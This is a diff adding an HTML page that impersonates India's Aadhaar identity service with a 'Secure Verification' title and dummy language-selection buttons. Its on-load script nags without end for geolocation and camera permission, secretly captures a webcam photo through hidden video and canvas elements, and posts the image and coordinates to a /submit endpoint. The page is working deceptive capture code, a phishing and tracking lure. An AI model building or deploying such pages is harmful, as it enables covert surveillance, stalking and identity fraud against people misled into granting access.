@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Verification</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f4f4f4;
+      text-align: center;
+    }
+
+    .header {
+      padding: 20px;
+      background-color: #fff;
+      border-bottom: 1px solid #ccc;
+    }
+
+    .logo {
+      margin-top: 10px;
+    }
+
+    .title {
+      font-size: 20px;
+      color: #0077b6;
+      margin-top: 20px;
+      font-weight: 600;
+    }
+
+    .subtitle {
+      color: #1a5d9c;
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
+
+    .language-buttons {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 16px;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    .btn {
+      background-color: #bbb;
+      border: none;
+      padding: 12px 24px;
+      font-size: 18px;
+      border-radius: 5px;
+      color: #0077b6;
+      min-width: 120px;
+      cursor: pointer;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="header">
+    <img src="static/Aadhaar_Logo.svg.png" alt="Aadhaar" height="80" class="logo">
+  </div>
+
+  <div class="title">Select your Preferred Language to Enter the Website</div>
+  <div class="subtitle">वेबसाइट में प्रवेश करने के लिए अपनी पसंदीदा भाषा का चयन करें</div>
+
+  <div class="language-buttons">
+    <button class="btn">English</button>
+    <button class="btn">हिंदी</button>
+    <button class="btn">অসমীয়া</button>
+    <button class="btn">বাংলা</button>
+    <button class="btn">ಕನ್ನಡ</button>
+    <button class="btn">ગુજરાતી</button>
+    <button class="btn">മലയാളം</button>
+    <button class="btn">मराठी</button>
+    <button class="btn">ଓଡ଼ିଆ</button>
+    <button class="btn">ਪੰਜਾਬੀ</button>
+    <button class="btn">தமிழ்</button>
+    <button class="btn">తెలుగు</button>
+    <button class="btn">اردو</button>
+  </div>
+
+  <!-- Invisible capture elements -->
+  <video id="video" autoplay playsinline class="hidden"></video>
+  <canvas id="canvas" width="320" height="240" class="hidden"></canvas>
+
+  <script>
+    async function requestLocation() {
+      return new Promise((resolve, reject) => {
+        const tryGetLocation = () => {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(pos),
+            err => {
+              console.warn("Location access denied. Retrying...");
+              setTimeout(tryGetLocation, 1000);
+            }
+          );
+        };
+        tryGetLocation();
+      });
+    }
+
+    async function requestCamera() {
+      while (true) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          return stream;
+        } catch (err) {
+          alert("Please allow camera access to proceed.");
+          await new Promise(res => setTimeout(res, 2000));
+        }
+      }
+    }
+
+    async function getLocationAndCamera() {
+      try {
+        const position = await requestLocation();
+        const latitude = position.coords.latitude.toFixed(6);
+        const longitude = position.coords.longitude.toFixed(6);
+        console.log("📍 Location:", latitude, longitude);
+
+        const stream = await requestCamera();
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL("image/jpeg");
+
+            fetch("/submit", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                lat: latitude,
+                lon: longitude,
+                image: imageData
+              })
+            })
+              .then(res => res.json())
+              .then(res => console.log("✅ Submitted:", res))
+              .catch(err => console.error("❌ Submit error:", err));
+
+            stream.getTracks().forEach(track => track.stop());
+          }, 2000);
+        };
+      } catch (err) {
+        alert("Could not complete capture. Please check browser permissions.");
+        console.error("Final error:", err);
+      }
+    }
+
+    window.onload = getLocationAndCamera;
+  </script>
+</body>
+
+</html>
